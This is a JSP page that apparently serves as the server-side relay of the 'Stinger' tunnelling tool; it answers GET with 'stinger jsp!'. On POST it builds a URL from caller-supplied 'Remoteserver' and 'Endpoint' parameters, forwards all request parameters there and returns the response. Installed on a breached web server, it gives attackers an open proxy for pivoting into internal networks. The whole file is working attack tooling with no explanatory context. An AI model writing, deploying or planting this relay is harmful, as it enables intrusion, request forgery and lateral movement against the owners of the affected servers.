<%@ page language="java" import="java.net.*,java.util.*,java.io.*,java.net.*" contentType="text/html; charset=utf-8" %>
<%!
    public static class HttpRequest {
        public static String sendPost(String url, byte[] param) {

            BufferedReader in = null;
            OutputStream ou = null;
            String result = "";
            try {
                URL realUrl = new URL(url);

                URLConnection conn = realUrl.openConnection();

                //conn.setRequestProperty("accept", "*/*");
                conn.setRequestProperty("Connection", "keep-alive");
                conn.setDoOutput(true);
                conn.setDoInput(true);

                ou = conn.getOutputStream();
                ou.write(param);
                ou.flush();
                in = new BufferedReader(
                        new InputStreamReader(conn.getInputStream()));
                String line;
                while ((line = in.readLine()) != null) {
                    result += line;
                }
            } catch (Exception e) {
                System.out.println("error to send post！" + e);
                return e.toString();
            } finally {
                try {
                    if (ou != null) {
                        ou.close();
                    }
                    if (in != null) {
                        in.close();
                    }
                } catch (IOException ex) {
                    return ex.toString();
                }
            }
            return result;
        }
    }
%>
<%
    String method = request.getMethod();
    if (method == "GET") {
        out.print("stinger jsp!");
        return;
    } else if (method == "POST") {
        String Endpoint = request.getParameter("Endpoint");
        String Remoteserver = request.getParameter("Remoteserver");
        String url = Remoteserver + Endpoint;
        String post_arg = "";
        String returnString="";
        Enumeration enu = request.getParameterNames();
        while (enu.hasMoreElements()) {
            String paraName = (String) enu.nextElement();
            post_arg = post_arg+paraName+"="+request.getParameter(URLEncoder.encode(paraName,"UTF-8"))+"&";

        }
        returnString = HttpRequest.sendPost(url, post_arg.getBytes());
        out.print(returnString);
    }
%>
